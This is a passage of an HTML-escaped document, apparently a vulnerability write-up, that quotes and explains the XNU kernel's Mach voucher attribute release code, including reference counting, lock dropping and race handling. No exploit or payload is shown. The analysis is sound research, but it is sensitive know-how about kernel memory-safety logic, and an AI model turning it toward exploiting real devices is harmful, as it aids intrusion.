class=\"BGLtzooHlW-c2\"&gt;)&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivac_unlock&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivac&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;return&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;if&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c15\"&gt;0&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;&amp;lt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;--&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivace&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivace_refs&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;)&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivac_unlock&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivac&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;return&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span&gt;First they grab references to the attribute manager and controller for the given key index (&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ivam&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ivac&lt;/span&gt;&lt;span&gt;), take the &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ivac&lt;/span&gt;&lt;span&gt;&amp;nbsp;lock then take calculate a pointer into the &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ivac&lt;/span&gt;&lt;span&gt;&amp;#39;s &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ivac_table&lt;/span&gt;&lt;span&gt;&amp;nbsp;to get a pointer to the &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ivac_entry&lt;/span&gt;&lt;span&gt;&amp;nbsp;corresponding to the &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;value_index&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&amp;nbsp;to be released.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span&gt;If this entry is marked as persistent, then nothing happens, otherwise the &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ivace_refs&lt;/span&gt;&lt;span&gt;&amp;nbsp;field is decremented. If the reference count is still non-zero, they drop the &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ivac&lt;/span&gt;&lt;span&gt;&amp;#39;s lock and return. Otherwise, the reference count of this &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ivac_entry&lt;/span&gt;&lt;span&gt;&amp;nbsp;has gone to zero and they will continue on to &amp;quot;free&amp;quot; the &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ivac_entry&lt;/span&gt;&lt;span&gt;. As noted before, this isn&amp;#39;t going to free the &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ivac_entry&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&amp;nbsp;to the zone allocator; the entry is just an entry in an array and in its free state its index is present in a freelist of empty indexes. The code continues thus:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.3548b2c452dd7eb3579b0290670f339199044845\"&gt;&lt;/a&gt;&lt;a id=\"t.43\"&gt;&lt;/a&gt;&lt;table class=\"BGLtzooHlW-c12\"&gt;&lt;tbody&gt;&lt;tr class=\"BGLtzooHlW-c1\"&gt;&lt;td class=\"BGLtzooHlW-c13\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; key &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;iv_index_to_key&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;key_index&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;assert&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;MACH_VOUCHER_ATTR_KEY_NONE &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;!=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;key&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;/*&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;* if last return reply is still pending,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;* let it handle this later return when&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;* the previous reply comes in.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;*/&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;if&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivace&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivace_releasing&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;)&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivac_unlock&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivac&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;return&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;/* claim releasing */&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivace&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivace_releasing &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;TRUE&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;iv_index_to_key&lt;/span&gt;&lt;span&gt;&amp;nbsp;goes back from the &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;key_index&lt;/span&gt;&lt;span&gt;&amp;nbsp;to the key value (which in practice will be 1 greater than the key index.) Then the &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ivace_entry&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&amp;nbsp;is marked as &amp;quot;releasing&amp;quot;. The code continues:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.2d8847df4f2d48c8c26863add2566524e8dbcae8\"&gt;&lt;/a&gt;&lt;a id=\"t.44\"&gt;&lt;/a&gt;&lt;table class=\"BGLtzooHlW-c12\"&gt;&lt;tbody&gt;&lt;tr class=\"BGLtzooHlW-c1\"&gt;&lt;td class=\"BGLtzooHlW-c13\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; value &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;ivace&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivace_value&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;redrive&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;assert&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;value &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;==&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;ivace&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivace_value&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;assert&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(!&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivace&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivace_free&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; made &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;ivace&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivace_made&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivac_unlock&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivac&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;/* callout to manager&amp;#39;s release_value */&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; kr &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivam&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivam_release_value&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;)(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivam&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;key&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;value&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;made&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;/* recalculate entry address as table may have changed */&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivac_lock&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivac&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivace &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;&amp;amp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivac&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivac_table&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;[&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;value_index&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;];&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;assert&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;value &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;==&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;ivace&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivace_value&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;/*&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;* new made values raced with this return. &amp;nbsp;If the&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;* manager OK&amp;#39;ed the prior release, we have to start&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;* the made numbering over again (pretend the race&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;* didn&amp;#39;t happen). If the entry has zero refs again,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;* re-drive the release.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;*/&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;if&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivace&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivace_made &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;!=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;made&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;)&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;if&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;KERN_SUCCESS &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;==&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;kr&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;)&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivace&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivace_made &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;-=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;made&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c8\"&gt;&lt;span 